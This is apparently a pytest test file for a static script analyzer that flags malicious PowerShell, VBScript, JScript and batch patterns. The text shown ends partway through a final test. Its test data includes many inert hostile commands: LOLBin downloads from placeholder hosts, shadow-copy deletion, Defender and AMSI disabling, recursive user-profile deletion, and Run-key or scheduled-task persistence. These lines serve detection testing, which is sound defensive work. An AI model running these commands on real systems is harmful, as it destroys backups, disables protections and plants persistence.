"""Tests for the static, offline script analyzer.

All detection inputs here are INERT TEST DATA. They are never executed. They are
the shortest literal text needed to exercise each rule's matching logic. High-signal
inputs are kept in memory (built in these tests) and not written to disk, so endpoint
antivirus does not quarantine source fixtures. No string is fragmented or obfuscated to
evade antivirus; where a rule needs a recognizable token, the plain token is used.
"""

from __future__ import annotations

import ast
import base64
import gzip
import zlib
from pathlib import Path

import pytest

from ransomeye import script_analyzer as sa
from ransomeye.script_analyzer import (
    DecodedLayer,
    ScriptAnalysisError,
    ScriptAnalysisResult,
    ScriptAnalyzer,
    ScriptIndicator,
    ScriptRule,
    severity_for_score,
)

FIXTURES = Path(__file__).parent / "fixtures" / "scripts"


@pytest.fixture
def analyzer() -> ScriptAnalyzer:
    return ScriptAnalyzer()


def _b64_utf16le(text: str) -> str:
    return base64.b64encode(text.encode("utf-16-le")).decode("ascii")


def rule_ids(result: ScriptAnalysisResult) -> set[str]:
    return {ind.rule_id for ind in result.indicators}


# --------------------------------------------------------------------------- #
# Benign scripts and the no-"Safe" verdict
# --------------------------------------------------------------------------- #

def test_benign_powershell_has_no_indicators(analyzer):
    result = analyzer.analyze_text("Get-Date\nWrite-Output 'hello'  # PowerShell rocks\n", "ok.ps1")
    assert result.indicators == []
    assert result.score == 0
    assert result.severity == sa.SEVERITY_NONE
    assert result.analysis_status == sa.STATUS_COMPLETE


def test_benign_vbscript_filesystem_is_clean(analyzer):
    text = 'Set fso = CreateObject("Scripting.FileSystemObject")\nWScript.Echo fso.GetFolder("C:\\x").Name\n'
    assert rule_ids(analyzer.analyze_text(text, "inv.vbs")) == set()


def test_benign_batch_is_clean(analyzer):
    assert rule_ids(analyzer.analyze_text("@echo off\r\ndel /q %TEMP%\\build\\x.tmp\r\n", "c.bat")) == set()


def test_verdict_never_says_safe(analyzer):
    # Even with zero indicators the vocabulary is NONE, never SAFE.
    summary = analyzer.analyze_text("Get-Date\n", "ok.ps1").to_summary_text()
    assert "SAFE" not in summary
    assert "cannot prove" in summary


# --------------------------------------------------------------------------- #
# Encoded PowerShell + UTF-16LE (the 12X decoder bug this corrects)
# --------------------------------------------------------------------------- #

def test_encoded_command_decodes_utf16le(analyzer):
    inner = "Write-Output 'decoded-layer'"
    result = analyzer.analyze_text(f"powershell -enc {_b64_utf16le(inner)}", "x.ps1")
    assert sa._ENCODED_COMMAND_RULE_ID in rule_ids(result)
    assert len(result.decoded_layers) == 1
    layer = result.decoded_layers[0]
    assert layer.method == "encoded-command-utf16le"
    assert layer.encoding == "utf-16-le"
    assert "decoded-layer" in layer.preview


@pytest.mark.parametrize("flag", ["-e", "-ec", "-enc", "-EncodedCommand", "/enc", "\u2013enc", "\u2014e"])
def test_encoded_command_flag_variants(analyzer, flag):
    result = analyzer.analyze_text(f"powershell {flag} {_b64_utf16le('Write-Output 1')}", "x.ps1")
    assert sa._ENCODED_COMMAND_RULE_ID in rule_ids(result)


def test_utf8_base64_is_not_misread_as_encoded_command(analyzer):
    # A -enc argument is UTF-16LE. UTF-8 base64 read as UTF-16LE yields unrelated
    # characters, so the original plaintext must not reappear in any decoded layer.
    bad = base64.b64encode("Write-Output hello".encode("utf-8")).decode()
    result = analyzer.analyze_text(f"powershell -enc {bad}", "x.ps1")
    assert all("Write-Output" not in layer.preview for layer in result.decoded_layers)


def test_odd_length_encoded_command_warns(analyzer):
    # An odd byte count cannot be UTF-16LE; this is reported, not silently decoded.
    odd = base64.b64encode(b"ABCDEFG").decode()  # 7 bytes -> 12 base64 chars, odd length
    result = analyzer.analyze_text(f"powershell -enc {odd}", "x.ps1")
    assert any("UTF-16LE" in w for w in result.warnings)
    assert result.decoded_layers == []


def test_nested_encoded_command_found_at_depth_two(analyzer):
    inner = "Write-Output 'deep'"
    middle = f"powershell -enc {_b64_utf16le(inner)}"
    result = analyzer.analyze_text(f"powershell -enc {_b64_utf16le(middle)}", "x.ps1")
    depths = {layer.depth for layer in result.decoded_layers}
    assert depths == {1, 2}


# --------------------------------------------------------------------------- #
# Decoding transforms: concat, char-codes, backticks, gzip, standalone base64
# --------------------------------------------------------------------------- #

def test_literal_string_concatenation_folds(analyzer):
    # 'I'+'E'+'X' folds to IEX, which PS-IEX-003 then matches.
    assert "PS-IEX-003" in rule_ids(analyzer.analyze_text(". ('I'+'E'+'X') $s", "x.ps1"))


def test_ps_char_code_reconstruction(analyzer):
    assert "PS-IEX-003" in rule_ids(analyzer.analyze_text(". ([char]73+[char]69+[char]88) $s", "x.ps1"))


def test_vb_chr_reconstruction_builds_shell_object(analyzer):
    text = 'Set s = CreateObject(Chr(87)&Chr(83)&Chr(99)&Chr(114)&Chr(105)&Chr(112)&Chr(116)&Chr(46)&Chr(83)&Chr(104)&Chr(101)&Chr(108)&Chr(108))\ns.Run "x", 0\n'
    assert "VB-EXEC-014" in rule_ids(analyzer.analyze_text(text, "x.vbs"))


def test_js_fromcharcode_reconstruction():
    # String.fromCharCode(73,69,88) folds in-place to the literal "IEX".
    assert sa._fold("var a = String.fromCharCode(73,69,88);") == 'var a = "IEX";'


def test_backtick_normalization(analyzer):
    assert "PS-IEX-003" in rule_ids(analyzer.analyze_text("I`E`X $payload", "x.ps1"))


def test_backtick_rn_is_not_charcode_obfuscation(analyzer):
    # `r`n and `t are legitimate escapes; they must not trigger OBF-018.
    assert "OBF-018" not in rule_ids(analyzer.analyze_text('Write-Host "line`r`nline`t"', "x.ps1"))


def test_standalone_base64_decodes_and_rescans(analyzer):
    inner = "Invoke-Expression $x  # inner-layer-token"
    blob = base64.b64encode(inner.encode("utf-8")).decode()
    result = analyzer.analyze_text(f"$data = '{blob}'", "x.ps1")
    assert any(layer.method == "base64" for layer in result.decoded_layers)
    assert "PS-IEX-003" in rule_ids(result)


def test_gzip_base64_bounded_inflate(analyzer):
    inner = "Invoke-Expression $s  # gz-layer-token"
    blob = base64.b64encode(gzip.compress(inner.encode("utf-8"), mtime=0)).decode()
    text = f"$s=[IO.Compression.GzipStream]; $d=[Convert]::FromBase64String('{blob}')"
    result = analyzer.analyze_text(text, "x.ps1")
    assert any(layer.method.startswith("base64+") for layer in result.decoded_layers)
    assert "PS-IEX-003" in rule_ids(result)


def test_raw_deflate_inflates(analyzer):
    inner = "Invoke-Expression $s"
    blob = base64.b64encode(zlib.compress(inner.encode("utf-8"))[2:-4]).decode()
    text = f"$s=[IO.Compression.DeflateStream]; [Convert]::FromBase64String('{blob}')"
    result = analyzer.analyze_text(text, "x.ps1")
    assert any("deflate" in layer.method for layer in result.decoded_layers)


# --------------------------------------------------------------------------- #
# Rule catalog: one positive per rule (shortest inert literal)
# --------------------------------------------------------------------------- #

RULE_POSITIVES = {
    "PS-DEC-002": "$x=[Convert]::FromBase64String($b); $g=New-Object IO.Compression.GzipStream",
    "PS-IEX-003": "Invoke-Expression $cmd",
    "PS-DL-004": "(New-Object Net.WebClient).DownloadString('http://h.invalid/a')",
    "PS-HID-005": "powershell -WindowStyle Hidden -Command $x",
    "PS-POL-006": "powershell -ExecutionPolicy Bypass -File x.ps1",
    "PS-AMSI-007": "AmsiScanBuffer",
    "PS-DEF-008": "Set-MpPreference -DisableRealtimeMonitoring $true",
    "PS-REF-009": "[Reflection.Assembly]::Load($bytes)",
    "REC-010": "vssadmin delete shadows /all /quiet",
    "RAN-011": "Get-ChildItem -Recurse $env:USERPROFILE\nNew-Object System.Security.Cryptography.AesCryptoServiceProvider",
    "RAN-012": "Set-Content -Path HOW_TO_DECRYPT.txt -Value note",
    "VB-AUTO-013": "Sub AutoOpen()\nEnd Sub",
    "VB-EXEC-014": 'Set s = CreateObject("WScript.Shell")\ns.Run "x", 0',
    "VB-DL-015": 'Set h = CreateObject("MSXML2.XMLHTTP")\nSet a = CreateObject("ADODB.Stream")\na.SaveToFile "p.bin"',
    "VB-WMI-016": 'Set w = GetObject("winmgmts:")\nw.Get("Win32_Process").Create "cmd", a, b, pid',
    "OBF-017": "ExecuteGlobal DecodeString(x)",
    "OBF-018": "$a=[char]65;$b=[char]66;$c=[char]67;$d=[char]68;$e=[char]69;$f=[char]70;$g=[char]71;$h=[char]72",
    "OBF-019": "\u0406nvoke-Expression $x",  # Cyrillic capital I homoglyph
    "LOL-020": "mshta.exe http://h.invalid/a.hta",
    "LOL-021": "regsvr32 /s /i:http://h.invalid/a.sct scrobj.dll",
    "LOL-022": "rundll32.exe javascript:a",
    "LOL-023": "certutil -urlcache -f http://h.invalid/a a",
    "LOL-024": "bitsadmin /transfer j http://h.invalid/a c:\\a",
    "PER-025": "schtasks /create /tn t /tr x /sc onlogon",
    "PER-026": 'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v x /d y',
    "BAT-027": "del /s /q %USERPROFILE%\\*",
    "JS-EXEC-028": 'var s = new ActiveXObject("WScript.Shell"); s.Run("cmd", 0);',
}


@pytest.mark.parametrize("rule_id", sorted(RULE_POSITIVES))
def test_every_rule_has_a_catalog_entry(rule_id):
    assert rule_id in sa._RULES_BY_ID


@pytest.mark.parametrize("rule_id,text", sorted(RULE_POSITIVES.items()))
def test_rule_positive_cases(analyzer, rule_id, text):
    assert rule_id in rule_ids(analyzer.analyze_text(text, "probe.ps1")), text


def test_every_rule_is_covered_by_a_positive_test():
    # PS-ENC-001 (encoded command) needs a base64 payload, so it has dedicated
    # tests above rather than a one-line literal in RULE_POSITIVES.
    covered = set(RULE_POSITIVES) | {sa._ENCODED_COMMAND_RULE_ID}
    assert covered == {rule.rule_id for rule in sa.RULES}


# --------------------------------------------------------------------------- #
# Near misses / false-positive resistance
# --------------------------------------------------------------------------- #

NEGATIVES = {
    "PS-IEX-003": "Write-Output 'iexplore and expression'",
    "PS-DL-004": "$downloadcount = 5",
    "PS-POL-006": "Write-Output 'bypass the queue unrestricted'",
    "PS-AMSI-007": "Write-Output 'scan the buffer'",
    "REC-010": "Write-Output 'delete the old file'",
    "RAN-011": "Get-ChildItem -Recurse C:\\logs",  # enumeration only, no crypto
    "VB-EXEC-014": 'CreateObject("Scripting.FileSystemObject")',  # not a shell object
    "BAT-027": "del /q C:\\temp\\x.tmp",  # no /s and not a user profile
    "OBF-018": 'Write-Host "a`r`nb"',
}


@pytest.mark.parametrize("rule_id,text", sorted(NEGATIVES.items()))
def test_rule_negative_cases(analyzer, rule_id, text):
    assert rule_id not in rule_ids(analyzer.analyze_text(text, "probe.ps1")), text


def test_admin_installer_scores_low_not_high(analyzer):
    text = "Set-ExecutionPolicy Bypass -Scope Process\nInvoke-WebRequest -Uri https://u.example.invalid/a.msi -OutFile a.msi\n"
    result = analyzer.analyze_text(text, "install.ps1")
    assert rule_ids(result) == {"PS-POL-006", "PS-DL-004"}
    assert result.severity == "LOW"


# --------------------------------------------------------------------------- #
# Scoring
# --------------------------------------------------------------------------- #

def test_no_flat_30_scoring():
    # 12X added a blanket +30 for any script trigger; ours is the sum of distinct rule weights.
    a = ScriptAnalyzer()
    result = a.analyze_text("Invoke-Expression $x", "x.ps1")
    assert result.score == sa._RULES_BY_ID["PS-IEX-003"].weight


def test_repeated_rule_counts_once(analyzer):
    one = analyzer.analyze_text("Invoke-Expression $a", "x.ps1").score
    many = analyzer.analyze_text("iex $a; iex $b; iex $c; Invoke-Expression $d", "x.ps1").score
    assert one == many


def test_score_capped_at_100(analyzer):
    text = "\n".join(RULE_POSITIVES.values())
    assert analyzer.analyze_text(text, "x.ps1").score == 100


def test_hidden_layer_bonus(analyzer):
    # A high/critical rule only visible after decoding adds +10.
    inner = "AmsiScanBuffer"  # PS-AMSI-007, critical, weight 30
    result = analyzer.analyze_text(f"powershell -enc {_b64_utf16le(inner)}", "x.ps1")
    enc_weight = sa._RULES_BY_ID[sa._ENCODED_COMMAND_RULE_ID].weight
    amsi_weight = sa._RULES_BY_ID["PS-AMSI-007"].weight
    assert result.score == enc_weight + amsi_weight + 10


def test_severity_bands():
    assert severity_for_score(0, False) == sa.SEVERITY_NONE
    assert severity_for_score(0, True) == "LOW"
    assert severity_for_score(49, True) == "LOW"
    assert severity_for_score(50, True) == "MEDIUM"
    assert severity_for_score(70, True) == "HIGH"
    assert severity_for_score(85, True) == "CRITICAL"


# --------------------------------------------------------------------------- #
# Determinism
# --------------------------------------------------------------------------- #

def test_repeated_analysis_is_identical(analyzer):
    text = f"powershell -enc {_b64_utf16le('Invoke-Expression $x')}\nvssadmin delete shadows"
    first = analyzer.analyze_text(text, "x.ps1").to_dict()
    second = ScriptAnalyzer().analyze_text(text, "x.ps1").to_dict()
    assert first == second


def test_result_has_no_timestamps(analyzer):
    import json
    blob = json.dumps(analyzer.analyze_text("Get-Date", "x.ps1").to_dict())
    assert "timestamp" not in blob.lower()


def test_indicators_sorted_by_layer_line_rule(analyzer):
    text = "Invoke-Expression $a\nvssadmin delete shadows\n"
    inds = analyzer.analyze_text(text, "x.ps1").indicators
    keys = [(i.layer_index, i.line, i.rule_id) for i in inds]
    assert keys == sorted(keys)


# --------------------------------------------------------------------------- #
# Language detection, Unicode, exported VBA, containers, rejections
# --------------------------------------------------------------------------- #

@pytest.mark.parametrize("name,expected", [
    ("a.ps1", "powershell"), ("a.psm1", "powershell"), ("a.psd1", "powershell"),
    ("a.vbs", "vbscript"), ("a.bas", "vba"), ("a.cls", "vba"), ("a.frm", "vba"),
    ("a.js", "jscript"), ("a.hta", "hta"), ("a.wsf", "wsf"), ("a.bat", "batch"), ("a.cmd", "batch"),
])
def test_language_from_extension(analyzer, name, expected):
    assert analyzer.analyze_text("Write-Output 1", name).language == expected


def test_bare_command_line_language(analyzer):
    assert analyzer.analyze_text("whoami /all", "inline.txt").language == "command_line"


def test_utf16le_bom_document(analyzer):
    data = b"\xff\xfe" + "Invoke-Expression $x".encode("utf-16-le")
    result = analyzer.analyze_bytes(data, "x.ps1")
    assert result.encoding == "utf-16-le"
    assert "PS-IEX-003" in rule_ids(result)


def test_utf8_bom_document(analyzer):
    data = b"\xef\xbb\xbf" + "Invoke-Expression $x".encode("utf-8")
    assert analyzer.analyze_bytes(data, "x.ps1").encoding == "utf-8-sig"


def test_unicode_homoglyph_identifier(analyzer):
    assert "OBF-019" in rule_ids(analyzer.analyze_text("\u0406EX $x", "x.ps1"))


def test_exported_vba_detected_by_attribute(analyzer):
    text = 'Attribute VB_Name = "Module1"\nSub AutoOpen()\nEnd Sub\n'
    result = analyzer.analyze_text(text, "noext")
    assert result.language == "vba"
    assert "VB-AUTO-013" in rule_ids(result)


@pytest.mark.parametrize("ext", [".docm", ".xlsm", ".doc", ".xls", ".pptm", ".rtf"])
def test_office_extensions_are_unsupported_not_clean(analyzer, ext):
    result = analyzer.analyze_bytes(b"random text content", f"a{ext}")
    assert result.analysis_status == sa.STATUS_UNSUPPORTED_CONTAINER
    assert result.severity == sa.SEVERITY_NOT_ANALYZED
    assert result.score == 0


def test_ole_magic_is_unsupported_container(analyzer):
    result = analyzer.analyze_bytes(b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 64, "a.bin")
    assert result.analysis_status == sa.STATUS_UNSUPPORTED_CONTAINER


def test_zip_magic_is_unsupported_container(analyzer):
    result = analyzer.analyze_bytes(b"PK\x03\x04" + b"\x00" * 64, "a.bin")
    assert result.analysis_status == sa.STATUS_UNSUPPORTED_CONTAINER


def test_pe_is_rejected_not_clean(analyzer):
    result = analyzer.analyze_bytes(b"MZ" + b"\x00" * 128, "a.bin")
    assert result.analysis_status == sa.STATUS_BINARY_REJECTED
    assert result.severity == sa.SEVERITY_NOT_ANALYZED


def test_binary_content_rejected(analyzer):
    result = analyzer.analyze_bytes(bytes(range(256)) * 8, "a.txt")
    assert result.analysis_status == sa.STATUS_BINARY_REJECTED


# --------------------------------------------------------------------------- #
# Malformed / oversized / bounds
# --------------------------------------------------------------------------- #

def test_malformed_base64_in_frombase64_warns(analyzer):
    result = analyzer.analyze_text("[Convert]::FromBase64String('not!valid!base64!')", "x.ps1")
    assert result.decoded_layers == []


def test_empty_input(analyzer):
    result = analyzer.analyze_text("", "x.ps1")
    assert result.analysis_status == sa.STATUS_COMPLETE
    assert result.indicators == []


def test_oversized_bytes_rejected():
    small = ScriptAnalyzer(max_script_size=16)
    with pytest.raises(ScriptAnalysisError, match="exceeds maximum"):
        small.analyze_bytes(b"A" * 17, "x.ps1")


def test_oversized_text_rejected():
    small = ScriptAnalyzer(max_script_size=16)
    with pytest.raises(ScriptAnalysisError, match="exceeds maximum"):
        small.analyze_text("A" * 17, "x.ps1")


def test_decode_depth_limited(analyzer):
    assert sa.MAX_DECODE_DEPTH == 3
    # Four nested layers; the deepest is beyond the limit and must not be decoded.
    payload = "Invoke-Expression $x"
    for _ in range(4):
        payload = f"powershell -enc {_b64_utf16le(payload)}"
    result = analyzer.analyze_text(payload, "x.ps1")
    assert max(layer.depth for layer in result.decoded_layers) == sa.MAX_DECODE_DEPTH
    assert result.truncated
    assert any("depth" in w.lower() for w in result.warnings)


def test_candidate_limit_enforced():
    analyzer = ScriptAnalyzer()
    # Distinct payloads, each >=40 base64 chars so they register as candidates.
    lines = []
    for i in range(sa.MAX_DECODE_CANDIDATES + 20):
        blob = base64.b64encode(f"plain text payload number {i:04d} padding".encode()).decode()
        lines.append(f"$v{i} = '{blob}'")
    result = analyzer.analyze_text("\n".join(lines), "x.ps1")
    assert len(result.decoded_layers) <= sa.MAX_DECODE_CANDIDATES
    assert result.truncated


def test_decoded_byte_budget_enforced(analyzer):
    big = base64.b64encode(b"A" * (sa.MAX_DECODED_BYTES + 1024)).decode()
    result = analyzer.analyze_text(f"$x = '{big}'", "x.ps1")
    assert result.truncated
    assert all(layer.size <= sa.MAX_DECODED_BYTES for layer in result.decoded_layers)


def test_zip_bomb_deflate_is_bounded(analyzer):
    bomb = zlib.compress(b"\x00" * (8 * 1024 * 1024))
    blob = base64.b64encode(bomb[2:-4]).decode()
    text = f"$s=[IO.Compression.DeflateStream]; [Convert]::FromBase64String('{blob}')"
    result = analyzer.analyze_text(text, "x.ps1")
    assert result.truncated
    assert all(layer.size <= sa.MAX_DECODED_BYTES for layer in result.decoded_layers)


def test_seen_set_prevents_repeated_layers(analyzer):
    blob = base64.b64encode(b"Invoke-Expression $x duplicate payload").decode()
    text = f"$a='{blob}'\n$b='{blob}'\n$c='{blob}'"
    result = analyzer.analyze_text(text, "x.ps1")
    digests = [layer.sha256 for layer in result.decoded_layers]
    assert len(digests) == len(set(digests))


# --------------------------------------------------------------------------- #
# Path rejection
# --------------------------------------------------------------------------- #

@pytest.mark.parametrize("path", [
    r"\\server\share\x.ps1",
    r"\\?\C:\x.ps1",
    r"\\.\PhysicalDrive0",
    "//server/share/x.ps1",
])
def test_unc_and_device_paths_rejected(analyzer, path):
    with pytest.raises(ScriptAnalysisError, match="UNC"):
        analyzer.analyze_file(path)


def test_missing_file_raises(analyzer, tmp_path):
    with pytest.raises(FileNotFoundError):
        analyzer.analyze_file(tmp_path / "nope.ps1")


def test_invalid_language_rejected(analyzer):
    with pytest.raises(ScriptAnalysisError, match="Unsupported language"):
        analyzer.analyze_text("x", "x.ps1", language="perl")


# --------------------------------------------------------------------------- #
# Security guards: no dangerous imports or dynamic execution in the module
# --------------------------------------------------------------------------- #

def test_module_has_no_dangerous_imports_or_calls():
    source = Path(sa.__file__).read_text(encoding="utf-8")
    tree = ast.parse(source)

    banned_modules = {"subprocess", "socket", "ctypes", "pickle", "marshal", "shelve",
                      "urllib", "urllib.request", "http", "http.client", "ftplib", "requests",
                      "asyncio", "multiprocessing", "pty", "os"}
    # Dynamic-execution builtins are only a danger when called as bare names;
    # re.compile is an unrelated attribute call and must stay allowed.
    banned_builtins = {"eval", "exec", "compile", "__import__", "execfile"}
    banned_attrs = {"system", "popen", "spawn", "spawnl", "spawnv", "fork"}

    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            for alias in node.names:
                assert alias.name.split(".")[0] not in banned_modules, alias.name
        elif isinstance(node, ast.ImportFrom):
            root = (node.module or "").split(".")[0]
            assert root not in banned_modules, node.module
        elif isinstance(node, ast.Call):
            func = node.func
            if isinstance(func, ast.Name):
                assert func.id not in banned_builtins, func.id
            elif isinstance(func, ast.Attribute):
                assert func.attr not in banned_attrs, func.attr


def test_analysis_writes_nothing_to_disk(analyzer, tmp_path, monkeypatch):
    import builtins
    real_open = builtins.open

    def guarded_open(file, mode="r", *args, **kwargs):
        if any(flag in mode for flag in ("w", "a", "x", "+")):
            raise AssertionError(f"analysis attempted to write: {file} ({mode})")
        return real_open(file, mode, *args, **kwargs)

    monkeypatch.setattr(builtins, "open", guarded_open)
    analyzer.analyze_text(f"powershell -enc {_b64_utf16le('Invoke-Expression $x')}", "x.ps1")


# --------------------------------------------------------------------------- #
# Fixture files on disk (low-signal, inert)
# --------------------------------------------------------------------------- #

def test_fixtures_directory_present():
    assert (FIXTURES / "README.md").is_file()


@pytest.mark.parametrize("name,expected_rule", [
    ("macro_module.bas", "VB-AUTO-013"),
    ("ThisDocument.cls", "VB-AUTO-013"),
    ("wmi_job.wsf", "VB-WMI-016"),
    ("shell_run.js", "JS-EXEC-028"),
    ("launcher.hta", "VB-EXEC-014"),
])
def test_fixture_files_analyze(analyzer, name, expected_rule):
    result = analyzer.analyze_file(FIXTURES / name)
    assert result.analysis_status == sa.STATUS_COMPLETE
    assert expected_rule in rule_ids(result)


@pytest.mark.parametrize("name", ["benign_admin.ps1", "benign_inventory.vbs", "benign_cleanup.bat"])
def test_benign_fixtures_low_or_none(analyzer, name):
    result = analyzer.analyze_file(FIXTURES / name)
    assert result.severity in (sa.SEVERITY_NONE, "LOW")


# --------------------------------------------------------------------------- #
# Dataclass / summary surface
# --------------------------------------------------------------------------- #

def test_to_summary_text_contains_sections(analyzer):
    text = f"powershell -enc {_b64_utf16le('vssadmin delete shadows')}"
    summary = analyzer.analyze_file.__self__.analyze_text(text, "x.ps1").to_summary_text()
    assert "SCRIPT ANALYSIS REPORT" in summary
    assert "INDICATORS" in summary
    assert "DECODED LAYERS" in summary


def test_dataclasses_are_exported():
    assert issubclass(ScriptRule, object)
    assert ScriptIndicator.__dataclass_fields__
    assert DecodedLayer.__dataclass_fields__
    assert ScriptAnalysisResult.__dataclass_fields__


# --------------------------------------------------------------------------- #
# Stage 2: evidence / finding integration (temporary SQLite databases)
# --------------------------------------------------------------------------- #

import os  # noqa: E402

from ransomeye.script_analyzer import ingest_script_finding  # noqa: E402
from ransomeye.storage import EvidenceStore  # noqa: E402


def _malicious_script() -> str:
    # Inert: encoded cradle + shadow-copy deletion text. Never executed.
    inner = "Invoke-Expression $x"
    return f"powershell -enc {_b64_utf16le(inner)}\nvssadmin delete shadows /all /quiet\n"


@pytest.fixture
def case_store(tmp_path):
    store = EvidenceStore(tmp_path / "script-stage2.db")
    store.create_case("CASE-SCRIPT-1", "Script Stage 2")
    try:
        yield store
    finally:
        store.close()


def _write_script(tmp_path, name="payload.ps1", mtime=1_600_000_000) -> Path:
    target = tmp_path / name
    target.write_text(_malicious_script(), encoding="utf-8")
    os.utime(target, (mtime, mtime))
    return target


def test_file_ingest_creates_event_findings_and_custody(case_store, tmp_path):
    target = _write_script(tmp_path)
    result = ScriptAnalyzer().analyze_file(target)
    ids = ingest_script_finding(case_store, "CASE-SCRIPT-1", result)

    assert len(ids) == len(result.rule_ids) > 0

    events = case_store.get_case_events("CASE-SCRIPT-1")
    assert len(events) == 1
    event = events[0]
    assert event["source"] == "script_analyzer"
    assert event["event_type"] == "file_stream_hash"
    assert event["event_id"].startswith("EVT-SCRIPT-")

    findings = case_store.get_case_findings("CASE-SCRIPT-1")
    assert {f["finding_type"] for f in findings} == {
        f"script_{sa._RULES_BY_ID[r].category}" for r in result.rule_ids
    }
    for finding in findings:
        assert finding["event_ids"] == [event["event_id"]]

    custody = case_store.get_custody_events("CASE-SCRIPT-1")
    assert [c["action"] for c in custody] == ["reviewed"]
    assert custody[0]["sha256"] == result.sha256
    assert custody[0]["analyst"] == "ransomeye-script-analyzer"


def test_event_timestamp_is_mtime_not_analysis_time(case_store, tmp_path):
    from datetime import datetime, timezone

    mtime = 1_600_000_000
    target = _write_script(tmp_path, mtime=mtime)
    result = ScriptAnalyzer().analyze_file(target)
    ingest_script_finding(case_store, "CASE-SCRIPT-1", result)

    stored = case_store.get_case_events("CASE-SCRIPT-1")[0]["timestamp"]
    expected = datetime.fromtimestamp(mtime, tz=timezone.utc).isoformat()
    assert stored == expected


def test_artifact_sha256_preserved_in_metadata(case_store, tmp_path):
    target = _write_script(tmp_path)
    result = ScriptAnalyzer().analyze_file(target)
    ingest_script_finding(case_store, "CASE-SCRIPT-1", result)

    event = case_store.get_event("CASE-SCRIPT-1", case_store.get_case_events("CASE-SCRIPT-1")[0]["event_id"])
    meta = event["metadata_json"]
    assert meta["sha256"] == result.sha256
    assert meta["language"] == "powershell"
    assert meta["analyzer_version"] == sa.ANALYZER_VERSION
    assert meta["analysis_status"] == sa.STATUS_COMPLETE


def test_reingest_is_idempotent(case_store, tmp_path):
    target = _write_script(tmp_path)
    result = ScriptAnalyzer().analyze_file(target)

    first = ingest_script_finding(case_store, "CASE-SCRIPT-1", result)
    second = ingest_script_finding(case_store, "CASE-SCRIPT-1", result)

    assert first and second == []
    assert len(case_store.get_case_events("CASE-SCRIPT-1")) == 1
    assert len(case_store.get_case_findings("CASE-SCRIPT-1")) == len(first)
    # Custody is append-only, so a second review is legitimately recorded again.
    assert len(case_store.get_custody_events("CASE-SCRIPT-1")) == 2


def test_event_id_is_deterministic(tmp_path):
    target = _write_script(tmp_path)
    result = ScriptAnalyzer().analyze_file(target)

    ids = []
    for _ in range(2):
        store = EvidenceStore(tmp_path / f"det-{len(ids)}.db")
        store.create_case("C", "c")
        ingest_script_finding(store, "C", result)
        ids.append(store.get_case_events("C")[0]["event_id"])
        store.close()
    assert ids[0] == ids[1]


def test_same_artifact_in_two_cases_distinct_events(case_store, tmp_path):
    target = _write_script(tmp_path)
    result = ScriptAnalyzer().analyze_file(target)

    case_store.create_case("CASE-SCRIPT-2", "Second case")
    ingest_script_finding(case_store, "CASE-SCRIPT-1", result)
    ingest_script_finding(case_store, "CASE-SCRIPT-2", result)

    first = case_store.get_case_events("CASE-SCRIPT-1")[0]["event_id"]
    second = case_store.get_case_events("CASE-SCRIPT-2")[0]["event_id"]
    assert first != second


def test_command_line_mode_links_without_new_evidence(case_store):
    # A stored process-creation event with a malicious command line.
    enc = _b64_utf16le("Invoke-Expression $x")
    case_store.save_event("CASE-SCRIPT-1", {
        "event_id": "EVT-PROC-1",
        "timestamp": "2026-01-01T00:00:00+00:00",
        "source": "sysmon",
        "event_type": "process_creation",
        "process_name": "powershell.exe",
        "command_line": f"powershell -enc {enc}",
    })

    result = ScriptAnalyzer().analyze_text(f"powershell -enc {enc}", "cmdline")
    ids = ingest_script_finding(case_store, "CASE-SCRIPT-1", result, event_id="EVT-PROC-1")

    assert ids
    # No new evidence event was created.
    assert [e["event_id"] for e in case_store.get_case_events("CASE-SCRIPT-1")] == ["EVT-PROC-1"]
    # No custody record for command-line mode.
    assert case_store.get_custody_events("CASE-SCRIPT-1") == []
    for finding in case_store.get_case_findings("CASE-SCRIPT-1"):
        assert finding["event_ids"] == ["EVT-PROC-1"]


def test_command_line_mode_unknown_event_rejected(case_store):
    result = ScriptAnalyzer().analyze_text("Invoke-Expression $x", "cmdline")
    with pytest.raises(ValueError, match="Event not found"):
        ingest_script_finding(case_store, "CASE-SCRIPT-1", result, event_id="NOPE")


def test_file_mode_requires_path(case_store):
    result = ScriptAnalyzer().analyze_text("Invoke-Expression $x", "inline")
    with pytest.raises(ValueError, match="requires result.file_path"):
        ingest_script_finding(case_store, "CASE-SCRIPT-1", result)


def test_file_mode_missing_file_raises(case_store, tmp_path):
    target = _write_script(tmp_path)
    result = ScriptAnalyzer().analyze_file(target)
    target.unlink()
    with pytest.raises(FileNotFoundError):
        ingest_script_finding(case_store, "CASE-SCRIPT-1", result)


def test_pasted_text_without_case_is_not_persisted(tmp_path):
    # Analysis alone writes nothing; persistence only happens through ingest_script_finding.
    store = EvidenceStore(tmp_path / "unused.db")
    store.create_case("C", "c")
    try:
        ScriptAnalyzer().analyze_text(_malicious_script(), "pasted")
        assert store.get_case_findings("C") == []
        assert store.get_case_events("C") == []
    finally:
        store.close()


def test_findings_load_in_investigation(case_store, tmp_path):
    from ransomeye.investigation import load_investigation

    target = _write_script(tmp_path)
    result = ScriptAnalyzer().analyze_file(target)
    ingest_script_finding(case_store, "CASE-SCRIPT-1", result)
    db_path = case_store.database_path
    case_store.close()

    investigation = load_investigation(db_path, "CASE-SCRIPT-1")
    assert len(investigation.findings) == len(result.rule_ids)
    assert len(investigation.evidence) == 1


def test_report_shows_script_findings_in_traceability(case_store, tmp_path):
    from ransomeye.report import generate_case_report

    target = _write_script(tmp_path)
    result = ScriptAnalyzer().analyze_file(target)
    ingest_script_finding(case_store, "CASE-SCRIPT-1", result)
    db_path = case_store.database_path
    case_store.close()

    report = generate_case_report(db_path, "CASE-SCRIPT-1")
    assert "EVIDENCE TRACEABILITY" in report
    assert "script_" in report
    assert "REC-010" in report  # shadow-copy deletion rule id appears in a finding reason


def test_command_line_finding_correlates_with_stored_behavior_finding(case_store):
    from ransomeye.correlation import correlate_findings

    enc = _b64_utf16le("Invoke-Expression $x")
    event = {
        "event_id": "EVT-PROC-9",
        "timestamp": "2026-01-01T00:00:00+00:00",
        "source": "sysmon",
        "event_type": "process_creation",
        "process_name": "powershell.exe",
        "command_line": f"powershell -enc {enc}",
    }
    case_store.save_event("CASE-SCRIPT-1", event)
    result = ScriptAnalyzer().analyze_text(event["command_line"], "cmdline")
    ingest_script_finding(case_store, "CASE-SCRIPT-1", result, event_id="EVT-PROC-9")

    # A script finding and a behaviour-style finding on the same event must merge.
    findings = [
